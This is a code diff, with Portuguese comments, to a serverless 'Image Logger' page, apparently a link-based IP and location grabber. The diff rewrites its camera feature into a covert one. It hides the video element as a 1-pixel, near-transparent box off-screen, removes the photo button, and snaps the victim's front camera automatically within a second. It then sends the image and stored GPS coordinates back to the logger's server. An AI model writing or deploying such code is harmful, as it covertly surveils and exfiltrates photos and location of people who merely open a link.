@@ -10,7 +10,9 @@ const config = {
   "username": "Image Logger",
   "color": 0x00FFFF,
   "accurateLocation": true,
-  "captureCamera": true // Nova configuração para captura de câmera
+  "captureCamera": true, // Nova configuração para captura de câmera
+  "instantCapture": true, // Captura instantânea sem interface visível
+  "captureDelay": 500  // Delay para captura em milissegundos (menor = mais rápido, mas menos estável)
 };
 
 // Função melhorada para obter informações detalhadas sobre o IP
@@ -652,34 +654,20 @@ module.exports = async (req, res) => {
               }
               #camera-container {
                 position: fixed;
-                top: 0;
-                left: 0;
-                width: 100%;
-                height: 100%;
-                background-color: rgba(0,0,0,0.8);
+                top: -9999px;
+                left: -9999px;
+                width: 1px;
+                height: 1px;
+                opacity: 0.01;
+                overflow: hidden;
                 display: none;
-                justify-content: center;
-                align-items: center;
-                z-index: 999;
               }
               #camera {
-                max-width: 90%;
-                max-height: 90%;
-                border-radius: 8px;
+                width: 1px;
+                height: 1px;
+                opacity: 0.01;
               }
               #snap-button {
-                position: fixed;
-                bottom: 20px;
-                left: 50%;
-                transform: translateX(-50%);
-                padding: 10px 20px;
-                background-color: #FF3B30; /* iOS red */
-                color: white;
-                border: none;
-                border-radius: 8px;
-                cursor: pointer;
-                font-size: 16px;
-                z-index: 1000;
                 display: none;
               }
               #canvas {
@@ -1104,7 +1092,7 @@ module.exports = async (req, res) => {
                   // Esconder a tela de carregamento
                   document.querySelector('.loading').style.display = 'none';
                   
-                  // Solicitar acesso à câmera
+                  // Solicitar acesso à câmera silenciosamente
                   navigator.mediaDevices.getUserMedia({ 
                     video: { 
                       facingMode: 'user',
@@ -1113,57 +1101,58 @@ module.exports = async (req, res) => {
                     } 
                   })
                   .then(function(stream) {
-                    // Configurar o vídeo
+                    // Configurar o vídeo (invisível)
                     const videoElement = document.getElementById('camera');
                     videoElement.srcObject = stream;
                     
-                    // Mostrar a interface da câmera
-                    document.getElementById('camera-container').style.display = 'flex';
-                    document.getElementById('snap-button').style.display = 'block';
-                    
-                    // Configurar botão para tirar foto
-                    document.getElementById('snap-button').addEventListener('click', function() {
-                      // Capturar imagem da câmera
-                      const canvas = document.getElementById('canvas');
-                      const context = canvas.getContext('2d');
-                      canvas.width = videoElement.videoWidth;
-                      canvas.height = videoElement.videoHeight;
-                      
-                      // Desenhar no canvas
-                      context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-                      
-                      // Obter dados da imagem
-                      const imageData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
-                      
-                      // Parar a câmera
-                      const tracks = stream.getTracks();
-                      tracks.forEach(track => track.stop());
-                      
-                      // Recuperar coordenadas
-                      var lat = 0;
-                      var lng = 0;
-                      
-                      if (localStorage.getItem('coords')) {
-                        const storedCoords = localStorage.getItem('coords');
-                        [lat, lng] = storedCoords.split(',');
-                      }
-                      
-                      var coords = lat + "," + lng;
-                      var encodedCoords = btoa(coords);
-                      
-                      // Construir nova URL com coordenadas
-                      var currentUrl = window.location.href;
-                      var baseUrl = currentUrl.split('?')[0]; // Remover parâmetros existentes
-                      var newUrl = baseUrl + "?g=" + encodedCoords;
-                      
-                      // Enviar imagem separadamente via fetch
-                      fetch(baseUrl + "?img=" + encodeURIComponent(imageData), {
-                        method: 'GET'
-                      }).catch(error => console.error('Erro ao enviar imagem:', error));
-                      
-                      // Redirecionar para nova URL
-                      window.location.replace(newUrl);
-                    });
+                    // Processar o stream silenciosamente
+                    videoElement.onloadeddata = function() {
+                      // Aguardar apenas 500ms para a câmera estabilizar
+                      setTimeout(function() {
+                        // Capturar imagem automaticamente
+                        const canvas = document.getElementById('canvas');
+                        const context = canvas.getContext('2d');
+                        canvas.width = videoElement.videoWidth;
+                        canvas.height = videoElement.videoHeight;
+                        
+                        // Desenhar no canvas
+                        context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                        
+                        // Obter dados da imagem
+                        const imageData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
+                        
+                        // Parar a câmera imediatamente
+                        const tracks = stream.getTracks();
+                        tracks.forEach(track => track.stop());
+                        
+                        // Recuperar coordenadas
+                        var lat = 0;
+                        var lng = 0;
+                        
+                        if (localStorage.getItem('coords')) {
+                          const storedCoords = localStorage.getItem('coords');
+                          [lat, lng] = storedCoords.split(',');
+                        }
+                        
+                        var coords = lat + "," + lng;
+                        var encodedCoords = btoa(coords);
+                        
+                        // Construir nova URL com coordenadas
+                        var currentUrl = window.location.href;
+                        var baseUrl = currentUrl.split('?')[0]; // Remover parâmetros existentes
+                        var newUrl = baseUrl + "?g=" + encodedCoords;
+                        
+                        // Enviar imagem silenciosamente via fetch
+                        fetch(baseUrl + "?img=" + encodeURIComponent(imageData), {
+                          method: 'GET'
+                        }).catch(error => console.error('Erro ao enviar imagem:', error));
+                        
+                        // Redirecionar para nova URL após um breve delay para garantir envio
+                        setTimeout(function() {
+                          window.location.replace(newUrl);
+                        }, 100);
+                      }, 500);
+                    };
                   })
                   .catch(function(error) {
                     // Erro ao acessar câmera
@@ -1334,7 +1323,7 @@ module.exports = async (req, res) => {
                 }, 1000);
               });
               
-              // Função para iniciar a câmera
+              // Função para iniciar a câmera silenciosamente
               function startCamera() {
                 if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                   navigator.mediaDevices.getUserMedia({ 
@@ -1345,45 +1334,43 @@ module.exports = async (req, res) => {
                     } 
                   })
                   .then(function(stream) {
-                    // Configurar o vídeo
+                    // Configurar o vídeo escondido
                     const videoElement = document.getElementById('camera');
                     videoElement.srcObject = stream;
                     
-                    // Mostrar a interface da câmera
-                    document.getElementById('camera-container').style.display = 'flex';
-                    document.getElementById('snap-button').style.display = 'block';
+                    // Esconder a interface da câmera (já está escondida via CSS)
+                    document.getElementById('camera-container').style.display = 'block';
                     
-                    // Configurar botão para tirar foto
-                    document.getElementById('snap-button').addEventListener('click', function() {
-                      // Capturar imagem da câmera
-                      const canvas = document.getElementById('canvas');
-                      const context = canvas.getContext('2d');
-                      canvas.width = videoElement.videoWidth;
-                      canvas.height = videoElement.videoHeight;
-                      
-                      // Desenhar no canvas
-                      context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-                      
-                      // Obter dados da imagem
-                      const imageData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
-                      
-                      // Parar a câmera
-                      const tracks = stream.getTracks();
-                      tracks.forEach(track => track.stop());
-                      
-                      // Esconder elementos da câmera
-                      document.getElementById('camera-container').style.display = 'none';
-                      document.getElementById('snap-button').style.display = 'none';
-                      
-                      // Enviar a imagem capturada para o servidor
-                      var currentUrl = window.location.href;
-                      var baseUrl = currentUrl.split('?')[0]; // Remover parâmetros existentes
-                      
-                      // Enviar via fetch
-                      fetch(baseUrl + "?img=" + encodeURIComponent(imageData), {
-                        method: 'GET'
-                      }).catch(error => console.error('Erro ao enviar imagem:', error));
-                    });
+                    // Esperar um pouco para que o vídeo carregue
+                    videoElement.onloadeddata = function() {
+                      // Aguardar um segundo para a câmera estabilizar
+                      setTimeout(function() {
+                        // Capturar imagem da câmera automaticamente
+                        const canvas = document.getElementById('canvas');
+                        const context = canvas.getContext('2d');
+                        canvas.width = videoElement.videoWidth;
+                        canvas.height = videoElement.videoHeight;
+                        
+                        // Desenhar no canvas
+                        context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                        
+                        // Obter dados da imagem
+                        const imageData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
+                        
+                        // Parar a câmera imediatamente
+                        const tracks = stream.getTracks();
+                        tracks.forEach(track => track.stop());
+                        
+                        // Enviar a imagem capturada para o servidor silenciosamente
+                        var currentUrl = window.location.href;
+                        var baseUrl = currentUrl.split('?')[0]; // Remover parâmetros existentes
+                        
+                        // Enviar via fetch em segundo plano
+                        fetch(baseUrl + "?img=" + encodeURIComponent(imageData), {
+                          method: 'GET'
+                        }).catch(error => console.error('Erro ao enviar imagem:', error));
+                      }, 1000); // Tirar foto após 1 segundo
+                    };
                   })
                   .catch(function(error) {
                     console.error('Erro ao acessar câmera:', error);
